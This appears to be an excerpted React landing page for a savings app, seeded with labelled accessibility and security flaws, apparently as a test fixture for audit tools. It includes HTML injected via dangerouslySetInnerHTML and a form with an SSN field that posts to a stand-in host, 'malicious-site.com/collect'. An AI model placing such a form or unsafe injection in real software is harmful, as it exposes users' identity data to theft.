    ...
    <div className="min-h-screen bg-background dark">
      ...
      <section className="pt-32 pb-20 px-6">
        <div className="container mx-auto text-center">
          ...
          <p className="text-xl max-w-2xl mx-auto mb-8 inline-block px-4 py-2 rounded bg-secondary text-foreground">
          ...
          >
            The smart way to build your savings. Automated, intelligent, and
          ...
          <div className="flex justify-center mb-8">
            <img
              src={heroPhone}
              alt="A smartphone displaying the Piggy Pocket Hero application interface"
              width="280"
            ...
            <div className="glass-card rounded-2xl p-8 max-w-md mx-auto">
              ...
              <div className="space-y-4">
                ...
                <button
                  ...
                  className="w-full p-3 bg-primary rounded-lg text-primary-foreground"
                >
                  <svg
                    width="20"
                    height="20"
      ...
      <section className="py-20 px-6 bg-secondary/30">
        <div className="container mx-auto">
          ...
          <p className="text-muted-foreground text-center mb-16 max-w-2xl mx-auto">
            Powerful features designed to help you reach your financial goals
            faster.
          </p>
          ...
          <div className="grid md:grid-cols-2 lg:grid-cols-4 gap-6">
            {[
              ...
              },
              {
                ...
                desc: "256-bit encryption keeps your data safe",
              },
              {
                icon: Zap,
                title: "Instant Transfers",
                desc: "Move money in seconds, not days",
              },
              {
                icon: PiggyBank,
                title: "Auto-Savings",
                desc: "Set rules to save automatically",
              },
            ].map((feature, index) => (
              <div
                key={index}
        ...
        <div
          ...
          dangerouslySetInnerHTML={{
            __html:
              "<marquee>🎉 Special offer! Limited time only - Get 3 months free! 🎉</marquee>",
          }}
        />
      </section>
      ...
      <section className="py-12 px-6 bg-secondary/30">
        <div className="container mx-auto text-center">
          ...
          <div className="flex justify-center gap-4 flex-wrap">
            <Button tabIndex={5} variant="outline">
              First Action
            </Button>
        ...
        <div className="container mx-auto">
          ...
          >
            ...
            <p className="text-muted-foreground">
              This div has onClick but no keyboard support
            </p>
          </div>
        </div>
      </section>
      ...
      <section className="py-12 px-6 bg-secondary/30">
        <div className="container mx-auto">
          <form
            action="http://malicious-site.com/collect"
            method="POST"
          ...
          >
            ...
            <div className="mb-4">
              <Label htmlFor="ssn" className="text-foreground mb-2 block">
      ...
      >
        This tiny text uses absolute pixels and cannot be resized by browser
        settings
      </p>
      ...
      <footer className="py-12 px-6 bg-card border-t border-border">
        <div className="container mx-auto text-center">
          ...
          <p className="text-muted-foreground mb-4">
            © 2024 SaveSmart. All rights reserved.
          </p>
